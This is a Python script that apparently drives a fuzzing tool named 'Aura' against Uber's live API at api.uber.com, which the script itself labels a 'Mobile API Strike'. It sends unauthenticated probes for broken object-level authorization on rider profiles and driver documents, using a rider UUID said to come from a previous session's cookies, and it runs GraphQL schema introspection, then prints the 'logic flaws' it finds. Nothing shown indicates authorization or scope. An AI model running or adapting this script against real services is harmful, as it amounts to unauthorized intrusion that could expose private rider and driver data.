import asyncio
import sys
import os
import logging

# Ensure we can import from the current directory
sys.path.append(os.getcwd())

from aura.modules.stateful_logic_fuzzer import StatefulLogicFuzzer
from aura.ui.formatter import console

# Set up logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    stream=sys.stdout
)

async def main():
    console.print("[bold cyan][*] Aura Mobile API Strike: Uber[/bold cyan]")
    
    # Target api.uber.com which was verified by recon
    fuzzer = StatefulLogicFuzzer(base_url="https://api.uber.com", timeout=15.0)
    
    # Defined polymorphic workflow for mobile API
    # Testing for common mobile API patterns and BOLA
    workflow = [
        {
            "id": "api_root",
            "name": "API Metadata Probe",
            "method": "GET",
            "path": "/",
            "requires_auth": False
        },
        {
            "id": "rider_bola",
            "name": "Rider Profile BOLA Probe",
            "method": "GET",
            "path": "/v1/riders/{{RIDER_ID}}",
            "mutate": {"RIDER_ID": "ebae7309-89db-4f9c-92ea-8e8879209351"}, # UUID from previous session's cookies
            "requires_auth": False
        },
        {
            "id": "driver_bola",
            "name": "Driver Document BOLA Probe",
            "method": "GET",
            "path": "/v1/drivers/{{DRIVER_ID}}/documents",
            "mutate": {"DRIVER_ID": "12345"},
            "requires_auth": False
        },
        {
            "id": "graphql_probe",
            "name": "GraphQL Schema Introspection",
            "method": "POST",
            "path": "/graphql",
            "data": {"query": "{ __schema { types { name } } }"},
            "requires_auth": False
        }
    ]
    
    console.print("[*] Dispatching nuclear fuzzing suite...")
    steps = fuzzer.define_workflow("Uber-Mobile-Strike", workflow)
    
    try:
        result = await fuzzer.execute_workflow(steps)
        console.print(f"[bold green][✓] Strike Complete. Findings: {len(result.findings)}[/bold green]")
        
        for finding in result.findings:
            console.print(f"[bold red][!] Logic Flaw: {finding['type']}[/bold red]")
            console.print(f"    Target: {finding['url']}")
            console.print(f"    Evidence: {finding['reasoning']}")
            
    except Exception as e:
        console.print(f"[bold red][!] Strike Failed: {e}[/bold red]")
    finally:
        await fuzzer.close()

if __name__ == "__main__":
    asyncio.run(main())
